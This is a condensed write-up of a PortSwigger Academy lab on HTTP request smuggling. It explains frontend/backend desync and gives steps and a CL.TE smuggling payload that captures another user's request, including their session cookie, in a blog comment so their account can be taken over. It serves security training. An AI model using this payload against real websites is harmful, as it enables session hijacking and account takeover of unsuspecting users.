# Lab: Exploiting HTTP request smuggling to capture other users' requests

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

## Lab idea

This exercise focuses on how request smuggling can cause another user’s request to be captured by an application. It practices assessing the confidentiality impact of request desynchronization on user-supplied request data and session material.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Visit a blog post and post a comment.
2. Send the comment-post request to Burp Repeater, shuffle the body parameters so the comment parameter occurs last, and make sure it still works.
3. Increase the comment-post request's Content-Length to 400, then smuggle it to the back-end server: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…
4. View the blog post to see if there's a comment containing a user's request.
5. Copy the user's Cookie header from the comment, and use it to access their account.

## Payloads / key values
- `comment-post`
- `comment`
- `Content-Length`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=your-session-token csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
